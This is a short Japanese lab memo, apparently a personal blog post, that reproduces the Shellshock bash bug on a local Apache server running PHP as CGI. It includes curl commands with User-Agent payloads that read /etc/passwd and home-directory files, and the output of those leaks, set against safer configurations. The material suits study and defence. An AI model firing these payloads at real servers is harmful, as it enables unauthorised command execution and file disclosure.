---
Keywords: CLI,こっそり置いておく
Copyright: (C) 2017 Ryuichi Ueda
---

# 実験メモ
何の実験かは・・・あれですね・・・。

こういうファイルを準備。
```bash
[root\@localhost httpd]# cat /var/www/html/index.php 
#!/usr/bin/env php

&lt;?php
	system('date');
?&gt;
```

<!--more-->

httpd.confのOptionsのところにExecCGIを追加し、
下にAddHandlerを書く。

```bash
 Options Indexes FollowSymLinks ExecCGI
 AddHandler cgi-script php
```

ホームの下にファイルを準備
```bash
[ueda\@localhost ~]$ ls -l mysecret 
-rw-rw-r--. 1 ueda ueda 13 10月 3 20:07 2014 mysecret
[ueda\@localhost ~]$ cat mysecret 
私の秘密
```

外側からcurlでつっつく。ポートフォワードでhttp://localhost:8888からつっつく。
```bash
uedambp:~ ueda$ curl -A '() { :; }; /bin/cat /home/ueda/*' http://localhost:8888/index.php
```

ログを確認。パーミッションで守られている。
```bash
[root\@localhost httpd]# tail error_log 
...
[Fri Oct 03 20:19:15 2014] [error] [client 10.0.2.2] /bin/cat: 
[Fri Oct 03 20:19:15 2014] [error] [client 10.0.2.2] /home/ueda/*
[Fri Oct 03 20:19:15 2014] [error] [client 10.0.2.2] : Permission denied
[Fri Oct 03 20:19:15 2014] [error] [client 10.0.2.2] 
```

もう一度突っつく。別のものを。
```bash
uedambp:~ ueda$ curl -A '() { :; }; /bin/cat /etc/passwd | /usr/bin/tail -n 3' http://localhost:8888/index.php
sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
ueda:x:500:500::/home/ueda:/bin/bash
apache:x:48:48:Apache:/var/www:/sbin/nologin
```
守られていない・・・。


今度はhttpd.confから追記部分をもう一度削り、index.phpを次のように書き換える。
```bash
[root\@localhost httpd]# cat /var/www/html/index.php 
&lt;?php
	system('date');
?&gt;
```

もう一度突っつく。
```bash
uedambp:~ ueda$ curl -A '() { :; }; /bin/cat /etc/passwd | /usr/bin/tail -n 3' http://localhost:8888/index.php
Fri Oct 3 20:27:38 JST 2014
```
大丈夫。

もう一度CGIモードで。こんなコード。
```bash
[root\@localhost httpd]# cat /var/www/html/index.php 
#!/usr/bin/php

&lt;?php
	print(&quot;hoge\\n&quot;);
?&gt;
```

```bash
uedambp:IPSJ_SHELLSHOCK ueda$ curl -A '() { :; }; /bin/cat /etc/passwd | /usr/bin/tail -n 3' http://localhost:8888/index.php 2&gt; /dev/null
hoge
```

大丈夫。

これは・・・
```bash
[root\@localhost httpd]# cat /var/www/html/index.php 
#!/usr/bin/php

&lt;?php
	system(&quot;date&quot;);
?&gt;
```

ダメ。
```bash
uedambp:IPSJ_SHELLSHOCK ueda$ curl -A '() { :; }; /bin/cat /etc/passwd | /usr/bin/tail -n 3' http://localhost:8888/index.php 2&gt; /dev/null
sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
ueda:x:500:500::/home/ueda:/bin/bash
apache:x:48:48:Apache:/var/www:/sbin/nologin
```
